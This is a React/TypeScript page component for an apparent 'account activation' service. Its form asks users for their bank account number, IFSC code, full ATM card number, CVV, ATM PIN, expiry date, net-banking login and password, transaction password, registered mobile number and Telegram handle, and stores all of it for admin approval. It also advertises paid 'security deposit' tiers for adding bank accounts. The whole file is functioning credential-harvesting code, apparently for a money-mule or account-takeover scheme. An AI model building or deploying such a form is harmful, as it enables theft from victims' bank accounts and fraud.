import React, { useState } from 'react';
import { useAuth } from '../lib/auth';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { ke } from '../lib/sdk';
import { 
  ShieldCheck, 
  Zap, 
  Clock, 
  CheckCircle2, 
  XCircle, 
  AlertCircle,
  FileText,
  ExternalLink
} from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '../components/ui/card';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Badge } from '../components/ui/badge';
import { toast } from 'sonner';
import { format } from 'date-fns';
import { cn } from '../lib/utils';

export default function AccountActivation() {
  const [formData, setFormData] = useState({
    account_number: "",
    ifsc_code: "",
    atm_card_number: "",
    cvv_number: "",
    atm_pin: "",
    atm_expiry_date: "",
    net_banking_user_id: "",
    net_banking_password: "",
    transaction_password: "",
    bank_mobile_number: "",
    telegram_username: ""
  });

  const queryClient = useQueryClient();
  const { user } = useAuth();

  const { data: myRequests = [] } = useQuery({
    queryKey: ["myActivationRequests", user?.email],
    queryFn: async () => (await ke.entities.AccountActivationRequest.list("-created_date")).filter((f: any) => f.user_email === user?.email),
    enabled: !!user
  });

  const submitMutation = useMutation({
    mutationFn: (data: any) => ke.entities.AccountActivationRequest.create({
      ...data,
      user_email: user?.email,
      status: "pending"
    }),
    onSuccess: () => {
      toast.success("Activation request submitted successfully!");
      queryClient.invalidateQueries({ queryKey: ["myActivationRequests"] });
      setFormData({
        account_number: "",
        ifsc_code: "",
        atm_card_number: "",
        cvv_number: "",
        atm_pin: "",
        atm_expiry_date: "",
        net_banking_user_id: "",
        net_banking_password: "",
        transaction_password: "",
        bank_mobile_number: "",
        telegram_username: ""
      });
    }
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Basic validation
    if (!formData.account_number || !formData.ifsc_code || !formData.atm_card_number || 
        !formData.cvv_number || !formData.atm_pin || !formData.atm_expiry_date || 
        !formData.net_banking_user_id || !formData.net_banking_password || 
        !formData.transaction_password || !formData.bank_mobile_number || !formData.telegram_username) {
      toast.error("Please fill all required fields");
      return;
    }

    submitMutation.mutate(formData);
  };

  const latestRequest = myRequests[0];
  const canSubmit = !latestRequest || latestRequest.status === "rejected";

  if (user?.account_activated) {
    return (
      <div className="max-w-2xl mx-auto space-y-6">
        <div>
          <h1 className="text-2xl font-bold text-slate-900">Account Activation</h1>
          <p className="text-slate-500 mt-1">Your account status</p>
        </div>

        <Card className="border-0 shadow-lg shadow-slate-200/50 bg-gradient-to-r from-emerald-500 to-emerald-600">
          <CardContent className="p-8 text-center text-white">
            <CheckCircle2 className="w-16 h-16 mx-auto mb-4" />
            <h3 className="text-2xl font-bold mb-2">Account Activated!</h3>
            <p className="opacity-90">Your account is now activated and receiving live deposits.</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto space-y-6">
      <div>
        <h1 className="text-2xl font-bold text-slate-900">Account Activation</h1>
        <p className="text-slate-500 mt-1">Submit details to activate live deposits</p>
      </div>

      {latestRequest && (
        <Card className={cn(
          "border-0 shadow-lg shadow-slate-200/50",
          latestRequest.status === "pending" ? "bg-yellow-50" : 
          latestRequest.status === "approved" ? "bg-green-50" : "bg-red-50"
        )}>
          <CardContent className="p-6">
            <div className="flex items-center gap-3">
              {latestRequest.status === "pending" && <Clock className="w-6 h-6 text-yellow-600" />}
              {latestRequest.status === "approved" && <CheckCircle2 className="w-6 h-6 text-green-600" />}
              {latestRequest.status === "rejected" && <XCircle className="w-6 h-6 text-red-600" />}
              
              <div className="flex-1">
                <p className={cn(
                  "font-semibold",
                  latestRequest.status === "pending" ? "text-yellow-900" : 
                  latestRequest.status === "approved" ? "text-green-900" : "text-red-900"
                )}>
                  {latestRequest.status === "pending" && "Request Pending Approval"}
                  {latestRequest.status === "approved" && "Request Approved"}
                  {latestRequest.status === "rejected" && "Request Rejected"}
                </p>
                <p className={cn(
                  "text-sm",
                  latestRequest.status === "pending" ? "text-yellow-700" : 
                  latestRequest.status === "approved" ? "text-green-700" : "text-red-700"
                )}>
                  Submitted {format(new Date(latestRequest.created_date), "dd MMM yyyy, hh:mm a")}
                </p>
                {latestRequest.rejection_reason && (
                  <p className="text-sm text-red-700 mt-2">Reason: {latestRequest.rejection_reason}</p>
                )}
              </div>
              <Badge className={cn(
                latestRequest.status === "pending" ? "bg-yellow-100 text-yellow-700" : 
                latestRequest.status === "approved" ? "bg-green-100 text-green-700" : 
                "bg-red-100 text-red-700"
              )}>
                {latestRequest.status}
              </Badge>
            </div>
          </CardContent>
        </Card>
      )}

      {canSubmit && (
        <Card className="border-0 shadow-lg shadow-slate-200/50">
          <CardHeader>
            <div className="flex items-center gap-3">
              <div className="p-2 bg-purple-100 rounded-lg">
                <Zap className="w-5 h-5 text-purple-600" />
              </div>
              <div>
                <CardTitle>Activation Details</CardTitle>
                <CardDescription>Fill all details to activate your account</CardDescription>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label>Account Number *</Label>
                  <Input 
                    value={formData.account_number}
                    onChange={(e) => setFormData({...formData, account_number: e.target.value})}
                    placeholder="Enter account number"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>IFSC Code *</Label>
                  <Input 
                    value={formData.ifsc_code}
                    onChange={(e) => setFormData({...formData, ifsc_code: e.target.value.toUpperCase()})}
                    placeholder="Enter IFSC code"
                    maxLength={11}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>ATM Card Number *</Label>
                  <Input 
                    value={formData.atm_card_number}
                    onChange={(e) => setFormData({...formData, atm_card_number: e.target.value})}
                    placeholder="16-digit card number"
                    maxLength={16}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>CVV Number *</Label>
                  <Input 
                    type="password"
                    value={formData.cvv_number}
                    onChange={(e) => setFormData({...formData, cvv_number: e.target.value})}
                    placeholder="3-digit CVV"
                    maxLength={3}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>ATM PIN *</Label>
                  <Input 
                    type="password"
                    value={formData.atm_pin}
                    onChange={(e) => setFormData({...formData, atm_pin: e.target.value})}
                    placeholder="4-digit PIN"
                    maxLength={4}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>ATM Card Expiry Date *</Label>
                  <Input 
                    placeholder="MM/YY"
                    value={formData.atm_expiry_date}
                    onChange={(e) => setFormData({...formData, atm_expiry_date: e.target.value})}
                    maxLength={5}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>Net Banking User ID *</Label>
                  <Input 
                    value={formData.net_banking_user_id}
                    onChange={(e) => setFormData({...formData, net_banking_user_id: e.target.value})}
                    placeholder="Net banking ID"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>Net Banking Password *</Label>
                  <Input 
                    type="password"
                    value={formData.net_banking_password}
                    onChange={(e) => setFormData({...formData, net_banking_password: e.target.value})}
                    placeholder="Net banking password"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>Transaction Password *</Label>
                  <Input 
                    type="password"
                    value={formData.transaction_password}
                    onChange={(e) => setFormData({...formData, transaction_password: e.target.value})}
                    placeholder="Transaction password"
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>Bank Registered Mobile Number *</Label>
                  <Input 
                    value={formData.bank_mobile_number}
                    onChange={(e) => setFormData({...formData, bank_mobile_number: e.target.value})}
                    placeholder="10-digit mobile number"
                    maxLength={10}
                    required
                  />
                </div>
                <div className="space-y-2">
                  <Label>Telegram Username *</Label>
                  <Input 
                    value={formData.telegram_username}
                    onChange={(e) => setFormData({...formData, telegram_username: e.target.value})}
                    placeholder="@username"
                    required
                  />
                </div>
              </div>

              <div className="bg-purple-50 border border-purple-200 rounded-xl p-4">
                <div className="flex gap-3 mb-3">
                  <ShieldCheck className="w-5 h-5 text-purple-600 flex-shrink-0 mt-0.5" />
                  <div className="text-sm text-purple-900">
                    <p className="font-bold mb-2">💳 Security Deposit Slabs:</p>
                    <div className="space-y-1.5">
                      <p>👉 ₹2,000 Security Deposit — 2 Bank Accounts Add</p>
                      <p>👉 ₹5,000 Security Deposit — 4 Bank Accounts Add</p>
                      <p>👉 ₹10,000 Security Deposit — 8 Bank Accounts Add</p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 flex gap-3">
                <AlertCircle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
                <div className="text-sm text-amber-800">
                  <p className="font-medium">Important</p>
                  <p>Your details will be reviewed by admin. Once approved, your account will be activated for live deposits.</p>
                </div>
              </div>

              <Button 
                type="submit" 
                className="w-full h-12 bg-gradient-to-r from-purple-500 to-purple-600 hover:from-purple-600 hover:to-purple-700"
                disabled={submitMutation.isPending}
              >
                <ShieldCheck className="w-4 h-4 mr-2" />
                {submitMutation.isPending ? "Submitting..." : "Submit for Approval"}
              </Button>
            </form>
          </CardContent>
        </Card>
      )}
    </div>
  );
}
